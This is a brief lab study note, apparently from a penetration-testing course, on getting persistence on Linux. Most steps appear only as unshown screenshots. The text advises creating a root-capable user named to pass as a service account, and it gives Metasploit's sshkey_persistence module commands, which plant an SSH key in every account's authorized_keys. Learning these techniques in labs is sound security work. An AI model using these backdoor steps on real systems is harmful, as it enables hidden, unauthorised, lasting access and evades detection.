![[Pasted image 20250822175303.png]]

**Adding New User:**
![[Pasted image 20250822180921.png]]
Make sure to make it blend into service accounts. Don't name user like backdoor

**Give root permissions:**
![[Pasted image 20250822181139.png]]

![[Pasted image 20250822181305.png]]

```
use post/linux/manage/sshkey_persistence
set SESSION 4
set CREATESSHFOLDER true
exploit
```
the above module runs successfully and will add a public SSH key to the authorized_keys file in the home directory of all user and service accounts.

Check this lab's solution in METASPLOIT FRAMEWORK:
#### Establishing Persistence On Linux

